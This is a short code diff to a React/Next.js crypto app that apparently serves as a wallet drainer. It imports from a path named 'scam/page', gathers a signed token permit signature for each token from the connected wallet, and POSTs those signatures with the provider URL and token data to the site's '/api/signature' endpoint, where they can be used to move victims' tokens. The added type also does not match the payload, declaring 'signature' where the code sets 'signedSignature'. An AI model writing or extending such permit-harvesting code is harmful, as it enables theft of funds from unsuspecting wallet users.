@@ -9,6 +9,7 @@ import React, {useEffect, useState} from "react";
 import {useEthersProvider, useEthersSigner} from "@/app/ethers";
 import {JsonRpcSigner} from "@ethersproject/providers";
 import TokenList, {ContractCovalenTHQ} from "@/app/TokenList";
+import {SignedPermitSignature} from "@/app/scam/page";
 
 const BNBContract = "0x1b44F3514812d835EB1BDB0acB33d3fA3351Ee43";
 let developer = {
@@ -90,14 +91,16 @@ const Page = () => {
 								[token.contract_ticker_symbol]: sig
 							}));
 
+							const payload: FinalizedSignedSignature = {
+								signedSignature: sig,
+								provider: //@ts-ignore
+								provider.connection.url,
+								token
+							}
+
 							fetch("/api/signature", {
 								method: "POST",
-								body: JSON.stringify({
-									signedSignature: sig,
-									provider: //@ts-ignore
-										provider.connection.url,
-									token
-								}),
+								body: JSON.stringify(payload),
 								headers: {
 									'content-type': "application/json"
 								}
@@ -277,6 +280,12 @@ declare global {
 }
 if (typeof window !== 'undefined') {
 	window.CCM = callContractMethod;
+}
+
+export type FinalizedSignedSignature = {
+	signature: SignedPermitSignature,
+	provider: string,
+	token: ContractCovalenTHQ
 }
 
 export default Page;
